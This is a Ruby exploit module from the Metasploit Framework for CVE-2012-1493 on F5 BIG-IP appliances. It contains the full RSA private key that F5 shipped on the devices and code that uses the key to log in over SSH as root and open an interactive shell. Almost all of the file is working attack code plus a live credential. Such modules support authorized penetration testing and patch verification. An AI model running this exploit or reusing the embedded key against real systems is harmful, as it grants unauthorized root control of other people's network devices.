##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'net/ssh'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Auxiliary::Report


  def initialize(info = {})
    super(update_info(info, {
      'Name'        => 'F5 BIG-IP SSH Private Key Exposure',
      'Version'     => '$Revision$',
      'Description' => %q{
        F5 ships a public/private key pair on BIG-IP appliances that allows
        passwordless authentication to any other BIG-IP box. Since the key is
        easily retrievable, an attacker can use it to gain unauthorized remote
        access as root.
      },
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Privileged'  => true,
      'Targets'     => [ [ "Universal", {} ] ],
      'Payload'     =>
        {
          'Compat'  => {
            'PayloadType'    => 'cmd_interact',
            'ConnectionType' => 'find',
          },
        },
      'Author'      => ['egypt'],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'URL', 'https://www.trustmatta.com/advisories/MATTA-2012-002.txt' ],
          [ 'CVE', '2012-1493' ],
          [ 'OSVDB', '82780' ]
        ],
      'DisclosureDate' => "Jun 11 2012",
      'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/interact' },
      'DefaultTarget' => 0,
    }))

    register_options(
      [
        # Since we don't include Tcp, we have to register this manually
        Opt::RHOST(),
        Opt::RPORT(22),
      ], self.class
    )

    register_advanced_options(
      [
        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
      ]
    )

  end

  # helper methods that normally come from Tcp
  def rhost
    datastore['RHOST']
  end
  def rport
    datastore['RPORT']
  end

  def do_login(user)

    opt_hash = {
      :auth_methods => ['publickey'],
      :msframework  => framework,
      :msfmodule    => self,
      :port         => rport,
      :key_data     => [ key_data ],
      :disable_agent => true,
      :config => false,
      :record_auth_info => true
    }
    opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
    begin
      ssh_socket = nil
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        ssh_socket = Net::SSH.start(rhost, user, opt_hash)
      end
    rescue Rex::ConnectionError, Rex::AddressInUse
      return :connection_error
    rescue Net::SSH::Disconnect, ::EOFError
      return :connection_disconnect
    rescue ::Timeout::Error
      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
      return :connection_disconnect
    rescue Net::SSH::AuthenticationFailed
      print_error "#{rhost}:#{rport} SSH - Failed authentication"
    rescue Net::SSH::Exception => e
      return [:fail,nil] # For whatever reason.
    end

    if ssh_socket

      # Create a new session from the socket, then dump it.
      conn = Net::SSH::CommandStream.new(ssh_socket, '/bin/sh', true)
      ssh_socket = nil

      return conn
    else
      return false
    end
  end

  def exploit
    conn = do_login("root")
    if conn
      print_good "Successful login"
      handler(conn.lsock)
    else
      print_error "Login failed"
    end
  end


  def key_data
    <<EOF
-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgQC8iELmyRPPHIeJ//uLLfKHG4rr84HXeGM+quySiCRgWtxbw4rh
UlP7n4XHvB3ixAKdWfys2pqHD/Hqx9w4wMj9e+fjIpTi3xOdh/YylRWvid3Pf0vk
OzWftKLWbay5Q3FZsq/nwjz40yGW3YhOtpK5NTQ0bKZY5zz4s2L4wdd0uQIBIwKB
gBWL6mOEsc6G6uszMrDSDRbBUbSQ26OYuuKXMPrNuwOynNdJjDcCGDoDmkK2adDF
8auVQXLXJ5poOOeh0AZ8br2vnk3hZd9mnF+uyDB3PO/tqpXOrpzSyuITy5LJZBBv
7r7kqhyBs0vuSdL/D+i1DHYf0nv2Ps4aspoBVumuQid7AkEA+tD3RDashPmoQJvM
2oWS7PO6ljUVXszuhHdUOaFtx60ZOg0OVwnh+NBbbszGpsOwwEE+OqrKMTZjYg3s
37+x/wJBAMBtwmoi05hBsA4Cvac66T1Vdhie8qf5dwL2PdHfu6hbOifSX/xSPnVL
RTbwU9+h/t6BOYdWA0xr0cWcjy1U6UcCQQDBfKF9w8bqPO+CTE2SoY6ZiNHEVNX4
rLf/ycShfIfjLcMA5YAXQiNZisow5xznC/1hHGM0kmF2a8kCf8VcJio5AkBi9p5/
uiOtY5xe+hhkofRLbce05AfEGeVvPM9V/gi8+7eCMa209xjOm70yMnRHIBys8gBU
Ot0f/O+KM0JR0+WvAkAskPvTXevY5wkp5mYXMBlUqEd7R3vGBV/qp4BldW5l0N4G
LesWvIh6+moTbFuPRoQnGO2P6D7Q5sPPqgqyefZS
-----END RSA PRIVATE KEY-----
EOF
    end
end
